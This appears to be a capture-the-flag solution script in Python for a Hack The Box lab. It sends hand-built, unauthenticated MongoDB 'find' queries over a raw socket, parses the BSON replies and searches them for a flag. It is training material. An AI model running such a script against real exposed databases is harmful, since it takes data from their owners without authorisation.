import socket
import struct

def bson_find(coll_name):
    cname = coll_name.encode()
    parts = []

    parts.append(b'\x02')  # string
    parts.append(b'find\x00')
    parts.append(struct.pack('<i', len(cname) + 1))
    parts.append(cname + b'\x00')

    parts.append(b'\x03')  # embedded doc
    parts.append(b'filter\x00')
    parts.append(struct.pack('<i', 5))
    parts.append(b'\x00')

    payload = b''.join(parts)
    total_length = struct.pack('<i', len(payload) + 4 + 1)
    return total_length + payload + b'\x00'

def build_query(bson_doc, db_name="admin"):
    full_collection = f"{db_name}.$cmd".encode() + b'\x00'
    header_len = 16 + 4 + len(full_collection) + 4 + 4 + len(bson_doc)
    header = struct.pack('<iiii', header_len, 1, 0, 2004)
    flags = struct.pack('<i', 0)
    skip = struct.pack('<i', 0)
    ret = struct.pack('<i', -1)
    return header + flags + full_collection + skip + ret + bson_doc

def parse_cstring(data, offset):
    end = data.index(0, offset)
    return data[offset:end].decode(), end + 1

def parse_string(data, offset):
    strlen = struct.unpack_from('<i', data, offset)[0]
    offset += 4
    value = data[offset:offset + strlen - 1].decode()
    offset += strlen
    return value, offset

def parse_int32(data, offset):
    value = struct.unpack_from('<i', data, offset)[0]
    return value, offset + 4

def parse_document(data, offset):
    doc_len = struct.unpack_from('<i', data, offset)[0]
    end = offset + doc_len
    offset += 4
    doc = {}

    while offset < end - 1:
        type_byte = data[offset]
        offset += 1
        key, offset = parse_cstring(data, offset)

        if type_byte == 0x02:
            value, offset = parse_string(data, offset)
        elif type_byte == 0x10:
            value, offset = parse_int32(data, offset)
        elif type_byte == 0x01:
            value = struct.unpack_from('<d', data, offset)[0]
            offset += 8
        elif type_byte == 0x08:
            value = bool(data[offset])
            offset += 1
        elif type_byte == 0x03 or type_byte == 0x04:
            value, offset = parse_document(data, offset)
        else:
            value = f"<unknown:{hex(type_byte)}>"
            break

        doc[key] = value

    return doc, end

def get_documents(raw):
    docs = []
    offset = 36
    while offset < len(raw):
        try:
            doc, next_offset = parse_document(raw, offset)
            docs.append(doc)
            offset = next_offset
        except:
            break
    return docs

def send_query(sock, query):
    sock.sendall(query)
    return sock.recv(8192)

def search_flag(d):
    if isinstance(d, dict):
        for k, v in d.items():
            if isinstance(k, str) and "HTB{" in k:
                return k
            if isinstance(v, str) and "HTB{" in v:
                return v
            elif isinstance(v, dict):
                result = search_flag(v)
                if result:
                    return result
    return None

def main():
    host = '10.129.228.30'
    port = 27017
    db = "YOUR-DB"
    collnames = ["YOUR-DIR"]

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print(f"[+] Connected to MongoDB @ {host}, targeting DB: {db}")

    for coll in collnames:
        print(f"  └─ Trying collection: {coll}")
        try:
            q = build_query(bson_find(coll), db)
            r = send_query(s, q)
            docs = get_documents(r)

            if not docs:
                print("     [-] No response")
                continue

            if 'cursor' in docs[0] and 'firstBatch' in docs[0]['cursor']:
                results = docs[0]['cursor']['firstBatch']
            else:
                results = docs

            for d in results:
                print(f"     [*] Document: {d}")
                flag = search_flag(d)
                if flag:
                    print(f"\n FLAG FOUND: {flag}\n")
                    s.close()
                    return
        except Exception as e:
            print(f"     [!] Error: {e}")

    print("[-] Flag not found.")
    s.close()

if __name__ == "__main__":
    main()
